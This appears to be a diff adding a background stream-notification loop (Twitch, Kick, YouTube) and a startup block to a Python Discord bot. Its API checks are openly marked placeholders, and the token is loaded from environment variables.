+# Background tasks
+async def check_stream_notifications():
+    """Check for stream notifications in background"""
+    await bot.wait_until_ready()
+    
+    while not bot.is_closed():
+        try:
+            # Check Twitch streams
+            for guild_id, channels in twitch_notifications.items():
+                guild = bot.get_guild(guild_id)
+                if not guild:
+                    continue
+                
+                for channel_name, data in channels.items():
+                    try:
+                        # Here you would implement actual Twitch API check
+                        # This is a placeholder implementation
+                        current_time = datetime.now()
+                        last_check = data.get('last_check')
+                        
+                        # Check every 5 minutes
+                        if not last_check or (current_time - last_check).total_seconds() > 300:
+                            # Update last check time
+                            data['last_check'] = current_time
+                            
+                            # In a real implementation, you would:
+                            # 1. Call Twitch API to check if stream is live
+                            # 2. Compare with previous state
+                            # 3. Send notification if stream just went live
+                            pass
+                    
+                    except Exception as e:
+                        print(f"Twitch notification error for {channel_name}: {e}")
+            
+            # Check Kick streams
+            for guild_id, channels in kick_notifications.items():
+                guild = bot.get_guild(guild_id)
+                if not guild:
+                    continue
+                
+                for username, data in channels.items():
+                    try:
+                        # Similar implementation for Kick
+                        pass
+                    except Exception as e:
+                        print(f"Kick notification error for {username}: {e}")
+            
+            # Check YouTube streams
+            for guild_id, channels in youtube_notifications.items():
+                guild = bot.get_guild(guild_id)
+                if not guild:
+                    continue
+                
+                for channel_id, data in channels.items():
+                    try:
+                        # Similar implementation for YouTube
+                        pass
+                    except Exception as e:
+                        print(f"YouTube notification error for {channel_id}: {e}")
+        
+        except Exception as e:
+            print(f"Stream notification check error: {e}")
+        
+        # Wait 60 seconds before next check
+        await asyncio.sleep(60)
+
+# Start background tasks
+if __name__ == "__main__":
+    # Load environment variables
+    from dotenv import load_dotenv
+    load_dotenv()
+    
+    TOKEN = os.getenv('DISCORD_TOKEN')
+    
+    if not TOKEN:
+        print("❌ Error: DISCORD_TOKEN not found in environment variables")
+        print("Please create a .env file with DISCORD_TOKEN=your_token_here")
+    else:
+        # Start stream notification checker
+        bot.loop.create_task(check_stream_notifications())
+        
+        # Run the bot
+        try:
+            bot.run(TOKEN)
+        except discord.LoginFailure:
+            print("❌ Error: Invalid Discord token")
+        except Exception as e:
+            print(f"❌ Error starting bot: {e}")
